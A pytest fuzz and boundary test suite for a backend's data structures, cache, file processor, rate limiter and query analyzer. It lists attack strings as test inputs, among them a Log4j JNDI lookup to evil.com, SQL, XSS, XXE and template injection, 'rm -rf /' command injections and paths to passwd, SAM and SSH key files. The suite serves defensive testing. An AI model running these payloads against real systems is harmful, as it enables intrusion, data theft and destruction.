# Input Validation and Boundary Fuzz Tests
# Comprehensive fuzz testing for input validation, boundary conditions, and edge cases

import pytest
import random
import string
import json
import asyncio
import tempfile
import os
import sys
from typing import Any, Dict, List, Optional, Union, Callable, Tuple, Set
from unittest.mock import patch, Mock, MagicMock
import struct
import time
from io import StringIO, BytesIO
import threading

# Import components for boundary testing
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', 'src'))
from backend.core.optimized_data_structures import OptimizedTrie, HighPerformanceHashMap, OptimizedDataProcessor
from backend.core.optimized_llm_client import OptimizedLLMClient, SmartCache, OptimizedConnectionPool
from backend.core.rate_limiter import RateLimiter
from backend.core.optimized_file_io import OptimizedFileProcessor, StreamingCSVReader
from backend.core.enhanced_cache_integration import EnhancedCacheManager
from backend.core.intelligent_query_engine import IntelligentQueryRouter, QueryPatternAnalyzer


class BoundaryTestGenerator:
    """Generator for boundary and edge case test data"""
    
    @staticmethod
    def generate_boundary_integers() -> List[int]:
        """Generate boundary integer values"""
        return [
            0,                          # Zero
            1,                          # Minimum positive
            -1,                         # Maximum negative
            2**31 - 1,                  # Max 32-bit signed int
            -2**31,                     # Min 32-bit signed int
            2**32 - 1,                  # Max 32-bit unsigned int
            2**63 - 1,                  # Max 64-bit signed int
            -2**63,                     # Min 64-bit signed int
            2**64 - 1,                  # Max 64-bit unsigned int
            sys.maxsize,                # Python max int
            -sys.maxsize - 1,           # Python min int
        ]
    
    @staticmethod
    def generate_boundary_floats() -> List[float]:
        """Generate boundary float values"""
        return [
            0.0,                        # Zero
            -0.0,                       # Negative zero
            1.0,                        # One
            -1.0,                       # Negative one
            sys.float_info.min,         # Smallest positive float
            sys.float_info.max,         # Largest positive float
            sys.float_info.epsilon,     # Smallest difference
            1e-308,                     # Very small positive
            1e308,                      # Very large positive
            -1e308,                     # Very large negative
            float('inf'),               # Positive infinity
            float('-inf'),              # Negative infinity
            float('nan'),               # Not a number
        ]
    
    @staticmethod
    def generate_boundary_strings() -> List[str]:
        """Generate boundary string values"""
        return [
            "",                         # Empty string
            " ",                        # Single space
            "\n",                       # Single newline
            "\t",                       # Single tab
            "\0",                       # Null character
            "a",                        # Single character
            "A" * 1,                    # Single repeated char
            "A" * 1000,                 # Long string
            "A" * 10000,                # Very long string
            "A" * 100000,               # Extremely long string
            "\u0000",                   # Unicode null
            "\u00FF",                   # Extended ASCII
            "\u0100",                   # Unicode start
            "\uFFFF",                   # Unicode BMP end
            "🚀",                       # Emoji
            "🚀" * 1000,                # Many emojis
            "\x01\x02\x03\x04\x05",    # Control characters
            "\n" * 1000,                # Many newlines
            "\t" * 1000,                # Many tabs
            " " * 1000,                 # Many spaces
            json.dumps({}),             # Empty JSON
            json.dumps({"a": "b"}),     # Simple JSON
            "<script>alert('xss')</script>",  # XSS attempt
            "'; DROP TABLE users; --",  # SQL injection
            "../../../etc/passwd",      # Path traversal
            "%00",                      # Null byte injection
            "${jndi:ldap://evil.com}", # Log4j injection
        ]
    
    @staticmethod
    def generate_malformed_data() -> List[Dict[str, Any]]:
        """Generate malformed data structures"""
        return [
            {"incomplete": "json"},     # Missing closing brace will be added by JSON serializer
            [],                         # Empty array as dict value
            None,                       # None value
            {"nested": {"very": {"deep": {"structure": "value"}}}},  # Deep nesting
            {"circular_ref": "see_above"},  # Simulated circular reference
            {"unicode_key_🚀": "value"},    # Unicode in key
            {"": "empty_key"},              # Empty key
            {" ": "space_key"},             # Space key
            {"\n": "newline_key"},          # Newline key
            {"\t": "tab_key"},              # Tab key
            {"key\x00": "null_byte_key"},   # Null byte in key
            {"very_long_key" * 100: "value"},  # Very long key
        ]
    
    @staticmethod
    def generate_boundary_collections() -> List[Union[List, Dict, Set, Tuple]]:
        """Generate boundary collection sizes"""
        return [
            [],                         # Empty list
            [None],                     # List with None
            [None] * 1000,              # Many Nones
            list(range(1000)),          # Large list
            {},                         # Empty dict
            {i: i for i in range(1000)}, # Large dict
            set(),                      # Empty set
            set(range(1000)),           # Large set
            (),                         # Empty tuple
            tuple(range(1000)),         # Large tuple
        ]


class TestInputValidationFuzz:
    """Fuzz tests for input validation across all components"""
    
    def test_trie_input_validation_boundaries(self):
        """Test trie with boundary input values"""
        trie = OptimizedTrie()
        boundary_strings = BoundaryTestGenerator.generate_boundary_strings()
        
        for key in boundary_strings:
            for value in boundary_strings:
                try:
                    if len(key) > 0:  # Keys must be non-empty
                        trie.insert(key, {"value": value})
                        result = trie.search(key)
                        expected_result = {"value": value} if result is not None else None
                        assert result == expected_result, f"Failed for key='{repr(key)}', value='{repr(value)}'"
                except (TypeError, ValueError, MemoryError) as e:
                    # Some boundary cases may legitimately fail
                    print(f"Expected boundary failure: {type(e).__name__} for key={repr(key)}")
    
    def test_hashmap_input_validation_boundaries(self):
        """Test hashmap with boundary input values"""
        hashmap = HighPerformanceHashMap()
        boundary_strings = BoundaryTestGenerator.generate_boundary_strings()
        boundary_values = BoundaryTestGenerator.generate_boundary_integers() + \
                         BoundaryTestGenerator.generate_boundary_floats() + \
                         boundary_strings
        
        for key in boundary_strings:
            if len(key) > 0:  # Keys must be non-empty
                for value in boundary_values:
                    try:
                        hashmap.put(key, value)
                        result = hashmap.get(key)
                        
                        # Handle NaN comparison specially
                        if isinstance(value, float) and str(value) == 'nan':
                            assert str(result) == 'nan'
                        else:
                            assert result == value, f"Failed for key='{repr(key)}', value='{repr(value)}'"
                            
                    except (TypeError, ValueError, MemoryError, OverflowError) as e:
                        print(f"Expected boundary failure: {type(e).__name__} for key={repr(key)}, value={repr(value)}")
    
    def test_cache_boundary_conditions(self):
        """Test cache with boundary conditions"""
        boundary_sizes = [0, 1, 2, 1000, 10000]
        boundary_ttls = [0, 0.001, 1, 3600, 86400, float('inf')]
        
        for size in boundary_sizes:
            for ttl in boundary_ttls:
                try:
                    if size > 0:  # Cache size must be positive
                        cache = SmartCache(max_size=size, ttl=ttl)
                        
                        # Test with boundary string values
                        boundary_strings = BoundaryTestGenerator.generate_boundary_strings()
                        for i, key in enumerate(boundary_strings[:size]):  # Don't exceed cache size
                            if len(key) > 0:
                                cache.put(key, f"value_{i}")
                                
                                if ttl > 0.01:  # Should be retrievable for reasonable TTLs
                                    result = cache.get(key)
                                    assert result == f"value_{i}"
                                
                except (ValueError, TypeError, OverflowError) as e:
                    print(f"Expected cache boundary failure: {type(e).__name__} for size={size}, ttl={ttl}")
    
    def test_file_processor_malformed_inputs(self):
        """Test file processor with malformed inputs"""
        processor = OptimizedFileProcessor()
        
        malformed_json_samples = [
            '{"key": "value"',           # Missing closing brace
            '{"key": "value"}extra',     # Extra content
            '{key: "value"}',            # Unquoted key
            '{"key": undefined}',        # Invalid value
            '{"key": "value",}',         # Trailing comma
            '{"\\u": "invalid"}',        # Invalid unicode escape
            '""',                        # Just quotes
            '{null: null}',              # null key
            '{"nested": {"deep": {"incomplete"',  # Deeply incomplete
            '[]',                        # Array instead of object
        ]
        
        malformed_csv_samples = [
            'header1,header2\nvalue1',              # Missing value
            'header1,header2\nvalue1,value2,extra', # Extra value
            'header1,header2\n"unclosed quote,value2', # Unclosed quote
            ',header2\nvalue1,value2',              # Empty header
            'header1,\nvalue1,value2',              # Empty header
            'header1;header2\nvalue1;value2',       # Wrong delimiter
            '"header1,header2"\nvalue1,value2',     # Quoted header line
            '\xff\xfe\x00\x00',                    # Binary content
            'header1,header2\n\x00\x01\x02',       # Binary in data
        ]
        
        # Test malformed JSON
        for i, content in enumerate(malformed_json_samples):
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                try:
                    f.write(content)
                    temp_path = f.name
                except UnicodeEncodeError:
                    continue
            
            try:
                result = asyncio.run(processor.process_file(temp_path))
                # Should handle errors gracefully
                assert 'error' in result or 'data' in result
                print(f"JSON sample {i}: {result.get('error', 'processed successfully')}")
            except Exception as e:
                print(f"JSON sample {i} caused exception: {type(e).__name__}: {e}")
            finally:
                os.unlink(temp_path)
        
        # Test malformed CSV
        for i, content in enumerate(malformed_csv_samples):
            with tempfile.NamedTemporaryFile(mode='w', suffix='.csv', delete=False) as f:
                try:
                    f.write(content)
                    temp_path = f.name
                except UnicodeEncodeError:
                    continue
            
            try:
                result = asyncio.run(processor.process_file(temp_path))
                # Should handle errors gracefully
                assert 'error' in result or 'data' in result
                print(f"CSV sample {i}: {result.get('error', 'processed successfully')}")
            except Exception as e:
                print(f"CSV sample {i} caused exception: {type(e).__name__}: {e}")
            finally:
                # Windows-specific file cleanup with retry
                import time
                for attempt in range(3):
                    try:
                        os.unlink(temp_path)
                        break
                    except PermissionError:
                        if attempt < 2:
                            time.sleep(0.1)  # Small delay for file handle cleanup
                        else:
                            print(f"Warning: Could not delete temp file {temp_path}")
                            pass  # Continue test execution
    
    def test_query_analyzer_injection_resistance(self):
        """Test query analyzer resistance to injection attacks"""
        analyzer = QueryPatternAnalyzer()
        
        injection_patterns = [
            # SQL Injection patterns
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'/*",
            "1; SELECT * FROM users",
            "' UNION SELECT password FROM users --",
            
            # XSS patterns
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "onclick='alert(1)'",
            "<img src=x onerror=alert(1)>",
            
            # Command injection
            "; cat /etc/passwd",
            "| whoami",
            "&& rm -rf /",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            
            # Template injection
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config.items()}}",
            
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            
            # LDAP injection
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            
            # NoSQL injection
            "'; return true; var x='",
            "'; return db.users.find(); var x='",
            
            # XXE injection
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        ]
        
        for pattern in injection_patterns:
            try:
                result = analyzer.analyze_query(pattern)
                
                # Should handle malicious input safely
                assert isinstance(result, dict)
                assert 'query_type' in result
                
                # Should not expose sensitive information
                result_str = str(result).lower()
                assert '/etc/passwd' not in result_str
                assert 'password' not in result_str
                assert '<script>' not in result_str
                
                print(f"Injection pattern handled: {pattern[:50]}...")
                
            except Exception as e:
                # Should handle malicious inputs gracefully
                print(f"Injection pattern caused expected error: {type(e).__name__}")
    
    def test_connection_pool_boundary_conditions(self):
        """Test connection pool with boundary conditions"""
        boundary_pool_sizes = [1, 2, 10, 100, 1000]
        boundary_timeouts = [0.001, 1, 10, 60, 3600]
        
        for pool_size in boundary_pool_sizes:
            for timeout in boundary_timeouts:
                try:
                    pool = OptimizedConnectionPool(max_connections=pool_size, timeout=timeout)
                    
                    # Test acquiring connections up to limit using context manager
                    async def test_connections():
                        connections_acquired = 0
                        for i in range(min(pool_size, 10)):  # Don't test too many
                            try:
                                async with pool.get_connection() as conn:
                                    if conn:
                                        connections_acquired += 1
                            except Exception:
                                break
                        return connections_acquired
                    
                    # Test the connections
                    acquired_count = asyncio.run(test_connections())
                    
                except (ValueError, TypeError) as e:
                    print(f"Expected connection pool boundary failure: {type(e).__name__} for size={pool_size}, timeout={timeout}")
    
    def test_rate_limiter_boundary_conditions(self):
        """Test rate limiter with boundary conditions"""
        boundary_rates = [0.1, 1, 10, 100, 1000, 10000]
        boundary_windows = [0.1, 1, 60, 3600]
        
        for rate in boundary_rates:
            for window in boundary_windows:
                try:
                    limiter = RateLimiter(requests_per_second=rate, window_size=window)
                    
                    # Test rapid requests
                    for i in range(min(int(rate * 2), 100)):  # Test up to 2x rate, max 100
                        allowed = asyncio.run(limiter.is_allowed("test_key"))
                        # Should allow some requests within rate
                        if i < int(rate):
                            assert allowed, f"Rate limiter too restrictive at request {i}"
                    
                except (ValueError, TypeError, OverflowError) as e:
                    print(f"Expected rate limiter boundary failure: {type(e).__name__} for rate={rate}, window={window}")


class TestConcurrencyBoundaries:
    """Test boundary conditions under concurrent access"""
    
    def test_concurrent_trie_boundary_stress(self):
        """Test trie under concurrent boundary stress"""
        trie = OptimizedTrie()
        errors = []
        boundary_strings = BoundaryTestGenerator.generate_boundary_strings()
        
        def concurrent_operations(thread_id: int):
            """Perform concurrent operations with boundary values"""
            try:
                for i, key in enumerate(boundary_strings):
                    if len(key) > 0:
                        value = f"thread_{thread_id}_value_{i}"
                        trie.insert(key, value)
                        
                        result = trie.search(key)
                        if result != value:
                            errors.append(f"Thread {thread_id}: Expected {value}, got {result}")
            except Exception as e:
                errors.append(f"Thread {thread_id} error: {e}")
        
        # Run concurrent threads
        threads = []
        for i in range(3):  # Limited threads for boundary testing
            thread = threading.Thread(target=concurrent_operations, args=(i,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Should handle concurrent boundary access with reasonable success
        error_rate = len(errors) / (3 * len(boundary_strings))
        assert error_rate < 0.1, f"Too many errors: {error_rate:.2%} error rate"
    
    def test_concurrent_cache_boundary_stress(self):
        """Test cache under concurrent boundary stress"""
        cache = SmartCache(max_size=100, ttl=60)
        errors = []
        boundary_strings = BoundaryTestGenerator.generate_boundary_strings()
        
        def concurrent_cache_operations(thread_id: int):
            """Perform concurrent cache operations with boundary values"""
            try:
                for i, key in enumerate(boundary_strings):
                    if len(key) > 0:
                        value = f"thread_{thread_id}_value_{i}"
                        cache.put(key, value)
                        
                        result = cache.get(key)
                        if result is not None and result != value:
                            errors.append(f"Thread {thread_id}: Expected {value}, got {result}")
            except Exception as e:
                errors.append(f"Thread {thread_id} error: {e}")
        
        # Run concurrent threads
        threads = []
        for i in range(3):
            thread = threading.Thread(target=concurrent_cache_operations, args=(i,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Cache eviction under concurrency is expected, so we allow more errors
        error_rate = len(errors) / (3 * len(boundary_strings))
        assert error_rate < 0.3, f"Too many errors: {error_rate:.2%} error rate"
    
    def test_concurrent_file_processing_boundaries(self):
        """Test file processing under concurrent boundary conditions"""
        processor = OptimizedFileProcessor()
        errors = []
        
        # Create boundary test files
        test_files = []
        boundary_data = BoundaryTestGenerator.generate_malformed_data()
        
        for i, data in enumerate(boundary_data[:5]):  # Limit to 5 files
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                try:
                    json.dump(data, f)
                    test_files.append(f.name)
                except (TypeError, ValueError):
                    # Some boundary data can't be serialized
                    pass
        
        def concurrent_file_processing(thread_id: int):
            """Process files concurrently"""
            try:
                for file_path in test_files:
                    result = asyncio.run(processor.process_file(file_path))
                    # Should return some result, even if it's an error
                    assert isinstance(result, dict)
                    assert 'error' in result or 'data' in result
            except Exception as e:
                errors.append(f"Thread {thread_id} error: {e}")
        
        # Run concurrent threads
        threads = []
        for i in range(3):
            thread = threading.Thread(target=concurrent_file_processing, args=(i,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Clean up test files
        for file_path in test_files:
            try:
                os.unlink(file_path)
            except OSError:
                pass
        
        # Should handle concurrent file processing
        assert len(errors) == 0, f"Concurrent file processing errors: {errors}"


class TestMemoryBoundaries:
    """Test memory-related boundary conditions"""
    
    def test_memory_exhaustion_recovery(self):
        """Test recovery from memory exhaustion"""
        components = [
            OptimizedTrie(),
            HighPerformanceHashMap(),
            SmartCache(max_size=1000, ttl=3600)
        ]
        
        # Try to exhaust memory with large allocations
        large_strings = []
        try:
            for i in range(1000):  # Reduced from original to avoid system impact
                # Create progressively larger strings
                size = min(1000 * (i + 1), 100000)  # Cap at 100KB
                large_string = "x" * size
                large_strings.append(large_string)
                
                # Test components with large data
                for j, component in enumerate(components):
                    try:
                        key = f"large_key_{i}_{j}"
                        if hasattr(component, 'insert'):
                            component.insert(key, large_string)
                        elif hasattr(component, 'put'):
                            component.put(key, large_string)
                    except (MemoryError, OverflowError):
                        # Expected under memory pressure
                        break
                
                # Stop if we're using too much memory
                if i > 100 and len(large_strings) * 1000 > 50000000:  # 50MB limit
                    break
                    
        except MemoryError:
            # Expected when pushing memory limits
            pass
        
        # Components should still be functional after memory pressure
        for i, component in enumerate(components):
            try:
                test_key = f"recovery_test_{i}"
                test_value = f"recovery_value_{i}"
                
                if hasattr(component, 'insert'):
                    component.insert(test_key, test_value)
                    result = component.search(test_key)
                    assert result == test_value, f"Component {i} failed to recover"
                elif hasattr(component, 'put'):
                    component.put(test_key, test_value)
                    result = component.get(test_key)
                    # Cache might evict due to memory pressure, so allow None
                    if result is not None:
                        assert result == test_value, f"Component {i} failed to recover"
                        
            except Exception as e:
                pytest.fail(f"Component {i} failed to recover from memory pressure: {e}")
    
    def test_integer_overflow_boundaries(self):
        """Test integer overflow boundary conditions"""
        boundary_integers = BoundaryTestGenerator.generate_boundary_integers()
        
        # Test with data structures
        hashmap = HighPerformanceHashMap()
        
        for i, value in enumerate(boundary_integers):
            try:
                key = f"int_boundary_{i}"
                hashmap.put(key, value)
                result = hashmap.get(key)
                assert result == value, f"Integer boundary failed for {value}"
            except (OverflowError, ValueError) as e:
                print(f"Expected integer boundary failure for {value}: {e}")
    
    def test_float_precision_boundaries(self):
        """Test floating point precision boundaries"""
        boundary_floats = BoundaryTestGenerator.generate_boundary_floats()
        
        hashmap = HighPerformanceHashMap()
        
        for i, value in enumerate(boundary_floats):
            try:
                key = f"float_boundary_{i}"
                hashmap.put(key, value)
                result = hashmap.get(key)
                
                # Handle special float values
                if str(value) == 'nan':
                    assert str(result) == 'nan'
                elif value == float('inf'):
                    assert result == float('inf')
                elif value == float('-inf'):
                    assert result == float('-inf')
                else:
                    assert result == value, f"Float boundary failed for {value}"
                    
            except (OverflowError, ValueError) as e:
                print(f"Expected float boundary failure for {value}: {e}")


class TestSecurityBoundaries:
    """Test security-related boundary conditions"""
    
    def test_path_traversal_resistance(self):
        """Test resistance to path traversal attacks"""
        processor = OptimizedFileProcessor()
        
        path_traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",
            "file:///etc/passwd",
            "\\\\server\\share\\file",
            "/dev/null",
            "/proc/self/environ",
            "~/.ssh/id_rsa",
        ]
        
        for pattern in path_traversal_patterns:
            try:
                # Should not be able to process sensitive system files
                result = asyncio.run(processor.process_file(pattern))
                
                # Should either fail or return error
                if 'error' not in result:
                    # If it doesn't error, it should not contain sensitive data
                    data_str = str(result.get('data', '')).lower()
                    assert 'root:' not in data_str  # Unix passwd entry
                    assert 'administrator' not in data_str  # Windows admin
                    
            except (FileNotFoundError, PermissionError, OSError):
                # Expected for protected files
                pass
            except Exception as e:
                print(f"Path traversal pattern caused unexpected error: {e}")
    
    def test_null_byte_injection_resistance(self):
        """Test resistance to null byte injection"""
        components = [
            OptimizedTrie(),
            HighPerformanceHashMap(),
            SmartCache(max_size=100, ttl=3600)
        ]
        
        null_byte_patterns = [
            "normal_key\x00malicious_suffix",
            "\x00key_with_null_prefix",
            "key_with_null_middle\x00more_content",
            "multiple\x00null\x00bytes",
            "\x00\x00\x00",
            "unicode_null\u0000suffix",
        ]
        
        for pattern in null_byte_patterns:
            for component in components:
                try:
                    value = f"value_for_{hash(pattern)}"
                    
                    if hasattr(component, 'insert'):
                        component.insert(pattern, value)
                        result = component.search(pattern)
                        # Should either work correctly or reject the input
                        if result is not None:
                            assert result == value
                    elif hasattr(component, 'put'):
                        component.put(pattern, value)
                        result = component.get(pattern)
                        if result is not None:
                            assert result == value
                            
                except (ValueError, TypeError) as e:
                    # Expected for null byte rejection
                    print(f"Null byte pattern rejected: {repr(pattern)}")
    
    def test_buffer_overflow_resistance(self):
        """Test resistance to buffer overflow attempts"""
        # Test with extremely long inputs
        long_strings = [
            "A" * 10000,       # 10KB
            "A" * 100000,      # 100KB  
            "A" * 1000000,     # 1MB (reduced from 10MB to avoid system impact)
            "\x00" * 10000,    # Null bytes
            "🚀" * 10000,      # Unicode
        ]
        
        components = [
            OptimizedTrie(),
            HighPerformanceHashMap(),
        ]
        
        for long_string in long_strings:
            for component in components:
                try:
                    key = f"buffer_test_{len(long_string)}"
                    
                    if hasattr(component, 'insert'):
                        component.insert(key, long_string)
                        result = component.search(key)
                        if result is not None:
                            assert result == long_string
                    elif hasattr(component, 'put'):
                        component.put(key, long_string)
                        result = component.get(key)
                        if result is not None:
                            assert result == long_string
                            
                except (MemoryError, OverflowError, ValueError) as e:
                    # Expected for extremely large inputs
                    print(f"Buffer overflow protection triggered for {len(long_string)} bytes: {e}")


if __name__ == '__main__':
    # Run boundary and fuzz tests
    pytest.main([
        __file__,
        '-v',
        '--tb=short',
        '-x',  # Stop on first failure for boundary tests
    ])